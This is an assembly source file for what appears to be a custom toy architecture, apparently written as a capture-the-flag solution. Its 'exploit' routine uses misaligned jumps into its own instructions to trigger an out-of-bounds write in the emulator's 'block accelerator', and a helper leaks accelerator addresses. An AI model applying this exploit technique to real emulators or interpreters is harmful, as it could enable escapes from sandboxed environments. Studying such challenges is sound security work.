; Calling convention
; r0, r1, r2, r3 - argument registers, caller saved
; r4, r5, r6, r7 - callee saved
; r7 and sp are the same thing

.data
    shexstring: "0123456789ABCDEF"
    sstart: "start\n" db 0
    sstop: "stop\n" db 0
    snewline: "\n" db 0
.code


main:
    ; There's only one thing we care about here
    call exploit

    ; Test our print_16bit_hex function
    ; mov r0, 0xdead
    ; call print_16bit_hex
    ; call print_newline
    ; call block_accelerator_leak
    ; call print_newline
    ; call exit

; exploit an oob-write into the block accelerator
; trashes all registers, does not return
exploit:
    ; r5 = load block accelerator value to r0
    mov r5, exploit_load
    add r5, 2
    ; r6 = store r0 in block accelerator
    mov r6, exploit_store
    add r6, 2

    ; r4 is 0 first time we execute, 1 second time we execute
    mov r4, 0

exploit_loop:
    cmp r4, 0
    add r4, 1
    push r5
    ret
exploit_load:
    mov r0, 0x740c
    ; first time, don't modify block accelerator
    je exploit_first_loop
    add r0, 0x0021
exploit_first_loop:
    push r6
    ret
exploit_store:
    mov r0, 0x74c0
    jmp exploit_loop


; exit() -- exit the process
exit:
    mov r0, sstop
    call puts
    mov r0, 0
    mov r1, 0
    syscall


; print_newline() -- Print a newline
print_newline:
    mov r0, snewline
    call puts


; print_16bit_hex(uint16_t r0) -- Print the hex value in r0
print_16bit_hex:
    push r4
    mov r4, r0

    shr r0, 8
    call print_8bit_hex
    mov r0, r4
    and r0, 0xff
    call print_8bit_hex

    pop r4
    ret


; print_8bit_hex(uint8_t r0) -- Print the hex value in r0
print_8bit_hex:
    push r4
    push r5
    mov r4, r0
    mov r5, shexstring

    mov r1, r4
    shr r1, 4
    and r1, 0xf
    loadb r0, [r5, r1, 0]
    call putc

    mov r1, r4
    and r1, 0xf
    loadb r0, [r5, r1, 0]
    call putc
    
    pop r5
    pop r4
    ret


; putc(r0) -- Print the one-byte value in r0
putc:
    mov r1, putc_buf
    storeb r0, r1
    mov r0, 2
    mov r2, 1
    syscall
    ret
.data
    putc_buf: db 0
.code


; block_accelerator_leak() -- leak a current block accelerator address
;
; This executes twice. The first time it runs it makes sure all instructions
; have block accelerator information set. It then runs a second time, leaking
; out block accelerator information and printing it;
;
; This is used for sanity checking, but isn't used by the exploit
block_accelerator_leak:
    mov r0, bale
    add r0, 2
    push r0
    ret
bale:
    mov r0, 0x740e
    cmp r0, 0
    je bale_0
    call print_16bit_hex
bale_0:
    mov r0, bald
    add r0, 2
    push r0
    ret
bald:
    mov r0, 0x740d
    cmp r0, 0
    je bald_0
    call print_16bit_hex
bald_0:
    mov r0, balc
    add r0, 2
    push r0
    ret
balc:
    mov r0, 0x740c
    cmp r0, 0
    je balc_0
    call print_16bit_hex
balc_0:
    mov r0, balb
    add r0, 2
    push r0
    ret
balb:
    mov r0, 0x740b
    cmp r0, 0
    je block_accelerator_leak
    call print_16bit_hex
    
    ret


; strlen(r0) -- get the length of string in r0
strlen:
    mov r1, r0
    mov r0, 0
strlen_loop:
    loadb r2, [r1, r0, 0]
    cmp r2, 0
    je strlen_done
    add r0, 1
    jmp strlen_loop
strlen_done:
    ret


; puts(r0) -- print a string
puts:
    push r4
    mov r4, r0
    call strlen
    mov r2, r0
    mov r1, r4
    mov r0, 2
    syscall
    pop r4
    ret